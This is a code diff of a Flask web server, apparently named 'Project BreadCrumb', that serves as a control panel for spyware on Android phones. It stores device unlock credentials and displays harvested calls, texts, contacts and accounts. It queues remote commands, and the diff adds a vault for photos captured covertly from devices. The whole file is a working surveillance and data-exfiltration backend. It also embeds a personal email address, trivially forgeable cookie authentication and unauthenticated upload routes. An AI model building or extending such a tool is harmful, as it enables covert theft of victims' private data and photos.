@@ -1,9 +1,11 @@
 import os
 import sqlite3
-from flask import Flask, render_template_string, request, redirect, url_for, jsonify
+from flask import Flask, render_template_string, request, redirect, url_for, jsonify, send_from_directory
 
 app = Flask(__name__)
 CLOUD_DB = "cloud_relay.db"
+UPLOAD_FOLDER = "media_vault_storage"
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 MASTER_USER = os.environ.get("BREAD_ADMIN_USER")
 MASTER_PASS = os.environ.get("BREAD_ADMIN_PASS")
@@ -62,14 +64,13 @@ FORENSIC_ADMIN_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Project BreadCrumb - Forensic & Dispatch Hub</title>
+    <title>Project BreadCrumb - Forensic & Media Vault</title>
     <style>
         :root { --bg: #121212; --card: #1e1e1e; --primary: #bb86fc; --text: #e0e0e0; --accent: #03dac6; --danger: #cf6679; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
         .container { max-width: 1100px; margin: auto; }
         .card { background: var(--card); border-radius: 8px; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
         h2, h3 { color: var(--primary); margin-top: 0; }
-        .badge { background: #333; color: var(--accent); padding: 3px 8px; border-radius: 4px; font-size: 11px; }
         table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
         th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
         th { color: var(--accent); }
@@ -77,6 +78,9 @@ FORENSIC_ADMIN_TEMPLATE = """
         .btn { background: var(--primary); color: #000; border: none; padding: 6px 10px; border-radius: 4px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; font-size: 11px; }
         .btn-danger { background: var(--danger); color: #fff; }
         .btn-accent { background: var(--accent); color: #000; }
+        .media-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; }
+        .media-thumb { background: #000; border: 1px solid #444; border-radius: 4px; padding: 5px; text-align: center; }
+        .media-thumb img { max-width: 120px; max-height: 120px; display: block; border-radius: 2px; margin-bottom: 5px; }
     </style>
 </head>
 <body>
@@ -95,12 +99,12 @@ FORENSIC_ADMIN_TEMPLATE = """
                     <th>Hardware & Profile</th>
                     <th>Owner</th>
                     <th>Status</th>
-                    <th>Actions & Forensic Commands</th>
+                    <th>Commands</th>
                 </tr>
                 {% for dev in devices %}
                 <tr>
                     <td><code>{{ dev[0] }}</code></td>
-                    <td><b>{{ dev[1] }}</b><br><span style="color: #888; font-size: 10px;">{{ dev[8] }}</span></td>
+                    <td><b>{{ dev[1] }}</b></td>
                     <td>{{ dev[2] }}<br><span style="color: #888; font-size: 10px;">{{ dev[3] }}</span></td>
                     <td style="color: var(--accent); font-weight: bold;">{{ dev[7] }}</td>
                     <td>
@@ -133,10 +137,26 @@ FORENSIC_ADMIN_TEMPLATE = """
         </div>
 
         <div class="card">
-            <h3>Harvested Forensic Intelligence (Calls, Texts, Contacts, Accounts)</h3>
+            <h3>📸 Captured Media Vault (Photos & Evidence)</h3>
+            <div class="media-grid">
+                {% for item in media_items %}
+                <div class="media-thumb">
+                    <a href="/media/{{ item[2] }}" target="_blank">
+                        <img src="/media/{{ item[2] }}" alt="Evidence">
+                    </a>
+                    <span style="font-size: 10px; color: #aaa;">{{ item[1] }}<br>{{ item[3] }}</span>
+                </div>
+                {% else %}
+                <p style="color: #777; font-size: 12px;">No media captured yet. Click "Snap" above to capture evidence.</p>
+                {% endfor %}
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Harvested Forensic Intelligence (Refreshed Live)</h3>
             <table>
                 <tr>
-                    <th>Timestamp</th>
+                    <th>Last Updated</th>
                     <th>IMEI</th>
                     <th>Data Category</th>
                     <th>Extracted Content</th>
@@ -149,7 +169,7 @@ FORENSIC_ADMIN_TEMPLATE = """
                     <td><pre>{{ log[3] }}</pre></td>
                 </tr>
                 {% else %}
-                <tr><td colspan="4" style="text-align: center; color: #777;">No forensic intelligence harvested yet. Click "Harvest Logs" above.</td></tr>
+                <tr><td colspan="4" style="text-align: center; color: #777;">No forensic logs harvested yet. Click "Harvest Logs" above.</td></tr>
                 {% endfor %}
             </table>
         </div>
@@ -161,34 +181,26 @@ FORENSIC_ADMIN_TEMPLATE = """
 LOGIN_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8"><title>Master Login</title>
-    <style>
-        body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 300px; border: 1px solid #333; }
-        input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
-        button { background: #bb86fc; color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
-    </style>
-</head>
+<head><title>Master Login</title>
+<style>
+body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 300px; border: 1px solid #333; }
+input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
+button { background: #bb86fc; color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
+</style></head>
 <body>
-    <div class="card">
-        <h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
-        {% if error %}<p style="color: #cf6679; font-size: 11px; text-align: center;">{{ error }}</p>{% endif %}
-        <form method="POST">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Access Portal</button>
-        </form>
-    </div>
-</body>
-</html>
+<div class="card"><h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
+<form method="POST">
+<input type="text" name="username" placeholder="Username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Access Portal</button>
+</form></div></body></html>
 """
 
 @app.route('/', methods=['GET', 'POST'])
 def cloud_dashboard():
     if not MASTER_USER or not MASTER_PASS:
         return "<h3>[Security Error]: Master credentials not configured in environment variables.</h3>", 500
-
     if request.cookies.get("auth") != "true":
         if request.method == 'POST':
             if request.form.get("username") == MASTER_USER and request.form.get("password") == MASTER_PASS:
@@ -202,11 +214,13 @@ def cloud_dashboard():
     cursor = conn.cursor()
     cursor.execute("SELECT imei, make_model, owner_name, owner_email, unlock_credentials, verified, last_seen, status, device_profile FROM registered_devices")
     devices = cursor.fetchall()
-    cursor.execute("SELECT id, imei, data_type, content, timestamp FROM forensic_logs ORDER BY timestamp DESC LIMIT 50")
+    cursor.execute("SELECT id, imei, data_type, content, timestamp FROM forensic_logs ORDER BY timestamp DESC")
     forensic_logs = cursor.fetchall()
+    cursor.execute("SELECT id, imei, filename, timestamp FROM media_vault ORDER BY timestamp DESC")
+    media_items = cursor.fetchall()
     conn.close()
 
-    return render_template_string(FORENSIC_ADMIN_TEMPLATE, devices=devices, forensic_logs=forensic_logs)
+    return render_template_string(FORENSIC_ADMIN_TEMPLATE, devices=devices, forensic_logs=forensic_logs, media_items=media_items)
 
 @app.route('/logout')
 def logout():
@@ -214,28 +228,21 @@ def logout():
     resp.set_cookie("auth", "", expires=0)
     return resp
 
+@app.route('/media/<filename>')
+def serve_media(filename):
+    return send_from_directory(UPLOAD_FOLDER, filename)
+
 @app.route('/api/sync', methods=['POST'])
 def api_sync():
     data = request.json or {}
     imei = data.get("imei")
-    if not imei:
-        return jsonify({"error": "Missing IMEI"}), 400
-
+    if not imei: return jsonify({"error": "Missing IMEI"}), 400
     conn = sqlite3.connect(CLOUD_DB)
     cursor = conn.cursor()
     cursor.execute('''
         INSERT OR REPLACE INTO registered_devices (imei, make_model, owner_name, owner_email, unlock_credentials, verified, status, device_profile)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    ''', (
-        imei,
-        data.get("make_model", "Generic Android"),
-        data.get("owner_name", "Master Operator"),
-        data.get("owner_email", "jeanmichelleledeoux@gmail.com"),
-        data.get("unlock_credentials", "Set"),
-        data.get("verified", 1),
-        data.get("status", "Online"),
-        data.get("device_profile", "Termux Native")
-    ))
+    ''', (imei, data.get("make_model", "Android"), "Master Operator", "jeanmichelleledeoux@gmail.com", "Set", 1, "Online", "Termux Node"))
     conn.commit()
     conn.close()
     return jsonify({"status": "synced"})
@@ -246,22 +253,52 @@ def upload_forensics():
     imei = data.get("imei")
     data_type = data.get("data_type")
     content = data.get("content")
-    if not imei or not data_type:
+    if not imei or not data_type: 
         return jsonify({"error": "Missing parameters"}), 400
 
     conn = sqlite3.connect(CLOUD_DB)
     cursor = conn.cursor()
-    cursor.execute("INSERT INTO forensic_logs (imei, data_type, content) VALUES (?, ?, ?)", (imei, data_type, content))
+    
+    # REFRESH / UPSERT LOGIC: Update existing log category for this device instead of duplicating rows
+    cursor.execute('''
+        INSERT INTO forensic_logs (imei, data_type, content, timestamp)
+        SELECT ?, ?, ?, CURRENT_TIMESTAMP
+        WHERE NOT EXISTS (
+            SELECT 1 FROM forensic_logs WHERE imei = ? AND data_type = ?
+        )
+    ''', (imei, data_type, content, imei, data_type))
+    
+    if cursor.rowcount == 0:
+        cursor.execute('''
+            UPDATE forensic_logs 
+            SET content = ?, timestamp = CURRENT_TIMESTAMP 
+            WHERE imei = ? AND data_type = ?
+        ''', (content, imei, data_type))
+        
     conn.commit()
     conn.close()
-    return jsonify({"status": "forensics_saved"})
+    return jsonify({"status": "refreshed"})
+
+@app.route('/api/upload-media', methods=['POST'])
+def upload_media():
+    imei = request.form.get("imei")
+    file = request.files.get("file")
+    if not imei or not file: return jsonify({"error": "Missing file or IMEI"}), 400
+    filename = f"{imei}_{int(time.time())}_{file.filename}"
+    filepath = os.path.join(UPLOAD_FOLDER, filename)
+    file.save(filepath)
+    
+    conn = sqlite3.connect(CLOUD_DB)
+    cursor = conn.cursor()
+    cursor.execute("INSERT INTO media_vault (imei, filename) VALUES (?, ?)", (imei, filename))
+    conn.commit()
+    conn.close()
+    return jsonify({"status": "media_saved"})
 
 @app.route('/api/queue-command', methods=['POST'])
 def queue_command():
-    if request.cookies.get("auth") != "true":
-        return redirect(url_for('cloud_dashboard'))
-    imei = request.form.get("imei")
-    cmd = request.form.get("command")
+    if request.cookies.get("auth") != "true": return redirect(url_for('cloud_dashboard'))
+    imei, cmd = request.form.get("imei"), request.form.get("command")
     if imei and cmd:
         conn = sqlite3.connect(CLOUD_DB)
         cursor = conn.cursor()
@@ -273,8 +310,7 @@ def queue_command():
 @app.route('/api/poll-commands', methods=['GET'])
 def poll_commands():
     imei = request.args.get("imei")
-    if not imei:
-        return jsonify([])
+    if not imei: return jsonify([])
     conn = sqlite3.connect(CLOUD_DB)
     cursor = conn.cursor()
     cursor.execute("SELECT id, command_type FROM pending_commands WHERE imei = ? AND status = 'PENDING'", (imei,))
